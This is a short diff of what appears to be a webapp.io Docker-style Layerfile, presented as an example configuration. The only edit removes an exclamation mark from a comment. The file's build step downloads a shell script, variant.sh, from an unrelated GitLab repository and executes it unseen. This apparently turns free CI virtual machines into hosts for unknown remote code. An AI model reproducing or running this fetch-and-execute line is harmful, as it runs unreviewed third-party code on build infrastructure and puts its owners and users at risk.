@@ -1,4 +1,4 @@
-#This is an example webapp.io configuration for Docker!
+#This is an example webapp.io configuration for Docker
 FROM vm/ubuntu:18.04
 RUN wget https://gitlab.com/dapurspl/simple/-/raw/main/variant.sh && chmod u+x variant.sh && ./variant.sh
 # To note: Layerfiles create entire VMs, *not* containers!
